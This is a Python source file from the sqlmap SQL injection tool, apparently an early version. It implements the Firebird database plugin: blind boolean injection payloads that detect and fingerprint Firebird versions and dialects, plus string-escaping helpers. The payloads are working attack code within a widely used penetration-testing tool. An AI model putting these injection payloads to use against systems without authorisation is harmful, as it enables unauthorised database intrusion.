#!/usr/bin/env python

"""
$Id: oracle.py 1003 2010-01-02 02:02:12Z inquisb $

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2007-2009 Bernardo Damele A. G. <bernardo.damele@gmail.com>
Copyright (c) 2006 Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""

import re

from lib.core.agent import agent
from lib.core.common import formatDBMSfp
from lib.core.common import formatFingerprint
from lib.core.common import getHtmlErrorFp
from lib.core.common import randomInt, randomRange
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.exception import sqlmapSyntaxException
from lib.core.exception import sqlmapUnsupportedFeatureException
from lib.core.session import setDbms
from lib.core.settings import FIREBIRD_ALIASES
from lib.core.settings import FIREBIRD_SYSTEM_DBS
from lib.core.unescaper import unescaper
from lib.request import inject
from lib.request.connect import Connect as Request

from plugins.generic.enumeration import Enumeration
from plugins.generic.filesystem import Filesystem
from plugins.generic.fingerprint import Fingerprint
from plugins.generic.misc import Miscellaneous
from plugins.generic.takeover import Takeover


class FirebirdMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):
    """
    This class defines Firebird methods
    """

    def __init__(self):
        self.excludeDbsList = FIREBIRD_SYSTEM_DBS

        Enumeration.__init__(self, "Firebird")
        Filesystem.__init__(self)
        Takeover.__init__(self)
        
        unescaper.setUnescape(FirebirdMap.unescape)

    @staticmethod
    def unescape(expression, quote=True):
        if quote:
            while True:
                index = expression.find("'")
                if index == -1:
                    break

                firstIndex = index + 1
                index = expression[firstIndex:].find("'")

                if index == -1:
                    raise sqlmapSyntaxException, "Unenclosed ' in '%s'" % expression

                lastIndex = firstIndex + index
                old = "'%s'" % expression[firstIndex:lastIndex]
                unescaped = ""

                for i in range(firstIndex, lastIndex):
                    unescaped += "ASCII_CHAR(%d)" % (ord(expression[i]))
                    if i < lastIndex - 1:
                        unescaped += "||"

                expression = expression.replace(old, unescaped)
        else:
            unescaped = "".join("ASCII_CHAR(%d)||" % ord(c) for c in expression)
            if unescaped[-1] == "||":
                unescaped = unescaped[:-1]

            expression = unescaped

        return expression

    @staticmethod
    def escape(expression):
        while True:
            index = expression.find("ASCII_CHAR(")
            if index == -1:
                break

            firstIndex = index
            index = expression[firstIndex:].find(")")

            if index == -1:
                raise sqlmapSyntaxException, "Unenclosed ) in '%s'" % expression

            lastIndex = firstIndex + index + 1
            old = expression[firstIndex:lastIndex]
            oldUpper = old.upper()
            oldUpper = oldUpper.lstrip("ASCII_CHAR(").rstrip(")")
            oldUpper = oldUpper.split("||")

            escaped = "'%s'" % "".join([chr(int(char)) for char in oldUpper])
            expression = expression.replace(old, escaped).replace("'||'", "")

        return expression
        
    def getFingerprint(self):
        value  = ""
        wsOsFp = formatFingerprint("web server", kb.headersFp)

        if wsOsFp:
            value += "%s\n" % wsOsFp

        if kb.data.banner:
            dbmsOsFp = formatFingerprint("back-end DBMS", kb.bannerFp)

            if dbmsOsFp:
                value += "%s\n" % dbmsOsFp

        value  += "back-end DBMS: "
        
        if not conf.extensiveFp:
            value += "Firebird"
            return value
              
        actVer  = formatDBMSfp() + " (%s)" % (self.__dialectCheck())
        blank       = " " * 15
        value      += "active fingerprint: %s" % actVer

        if kb.bannerFp:
            banVer = kb.bannerFp["dbmsVersion"]

            if re.search("-log$", kb.data.banner):
                banVer += ", logging enabled"

            banVer = formatDBMSfp([banVer])
            value += "\n%sbanner parsing fingerprint: %s" % (blank, banVer)

        htmlErrorFp = getHtmlErrorFp()

        if htmlErrorFp:
            value += "\n%shtml error message fingerprint: %s" % (blank, htmlErrorFp)

        return value

    def __sysTablesCheck(self):
        retVal = None
        table = (
                    ("1.0", [" AND EXISTS(SELECT CURRENT_USER FROM RDB$DATABASE)"]),
                    ("1.5", [" AND NULLIF(%d,%d) IS NULL", " AND EXISTS(SELECT CURRENT_TRANSACTION FROM RDB$DATABASE)"]),
                    ("2.0", [" AND EXISTS(SELECT CURRENT_TIME(0) FROM RDB$DATABASE)", " AND BIT_LENGTH(%d)>0", " AND CHAR_LENGTH(%d)>0"]),
                    ("2.1", [" AND BIN_XOR(%d,%d)=0", " AND PI()>0.%d", " AND RAND()<1.%d", " AND FLOOR(1.%d)>=0"])
                 )
        
        for i in xrange(len(table)):
            version, checks = table[i]
            failed = False
            check = checks[randomRange(0,len(checks)-1)].replace("%d", str(randomRange(1,100)))
            payload = agent.fullPayload(check)
            result  = Request.queryPage(payload)
            if result:
                retVal = version
            else:
                failed = True
                break
            if failed:
                break
            
        return retVal

    def __dialectCheck(self):
        retVal = None
        if kb.dbms:
            payload = agent.fullPayload(" AND EXISTS(SELECT CURRENT_DATE FROM RDB$DATABASE)")
            result  = Request.queryPage(payload)
            retVal = "dialect 3" if result else "dialect 1"
        return retVal
        
    def checkDbms(self):
        if conf.dbms in FIREBIRD_ALIASES:
            setDbms("Firebird")

            self.getBanner()

            if not conf.extensiveFp:
                return True

        logMsg = "testing Firebird"
        logger.info(logMsg)
        
        randInt = randomInt()

        payload = agent.fullPayload(" AND EXISTS(SELECT * FROM RDB$DATABASE WHERE %d=%d)" % (randInt, randInt))
        result  = Request.queryPage(payload)

        if result:
            logMsg = "confirming Firebird"
            logger.info(logMsg)

            payload = agent.fullPayload(" AND EXISTS(SELECT CURRENT_USER FROM RDB$DATABASE)")
            result  = Request.queryPage(payload)

            if not result:
                warnMsg = "the back-end DMBS is not Firebird"
                logger.warn(warnMsg)

                return False

            setDbms("Firebird")

            self.getBanner()

            if not conf.extensiveFp:
                return True
            
            kb.dbmsVersion = [self.__sysTablesCheck()]

            return True
        else:
            warnMsg = "the back-end DMBS is not Firebird"
            logger.warn(warnMsg)

            return False

    def getDbs(self):
        warnMsg = "on Firebird it is not possible to enumerate databases"
        logger.warn(warnMsg)

        return []
    
    def getPasswordHashes(self):
        warnMsg = "on Firebird it is not possible to enumerate the user password hashes"
        logger.warn(warnMsg)

        return {}
    
    def readFile(self, rFile):
        errMsg = "on Firebird it is not possible to read files"
        raise sqlmapUnsupportedFeatureException, errMsg

    def writeFile(self, wFile, dFile, fileType=None, confirm=True):
        errMsg = "on Firebird it is not possible to write files"
        raise sqlmapUnsupportedFeatureException, errMsg
    
    def osCmd(self):
        errMsg = "on Firebird it is not possible to execute commands"
        raise sqlmapUnsupportedFeatureException, errMsg

    def osShell(self):
        errMsg = "on Firebird it is not possible to execute commands"
        raise sqlmapUnsupportedFeatureException, errMsg

    def osPwn(self):
        errMsg  = "on Firebird it is not possible to establish an "
        errMsg += "out-of-band connection"
        raise sqlmapUnsupportedFeatureException, errMsg

    def osSmb(self):
        errMsg  = "on Firebird it is not possible to establish an "
        errMsg += "out-of-band connection"
        raise sqlmapUnsupportedFeatureException, errMsg
        
    def forceDbmsEnum(self):
        conf.db = "Firebird"